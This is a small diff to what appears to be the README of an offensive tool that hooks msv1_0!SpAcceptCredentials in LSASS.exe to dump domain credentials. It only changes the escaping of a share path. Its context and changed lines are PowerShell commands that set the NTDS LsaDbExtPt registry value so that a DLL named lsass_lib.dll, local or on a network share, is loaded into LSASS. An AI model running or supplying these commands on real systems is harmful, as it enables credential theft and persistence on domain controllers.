@@ -5,7 +5,7 @@ LOCAL AND REMOTE HOOK msv1_0!SpAcceptCredentials from LSASS.exe and DUMP DOMAIN/
 run powershell v1.0
 
 New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "c:\temp\lsass_lib.dll"
-New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "\\share\lulz\lsass_lib.dll"
+New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "\\\\share\lulz\lsass_lib.dll"
 
 or
 
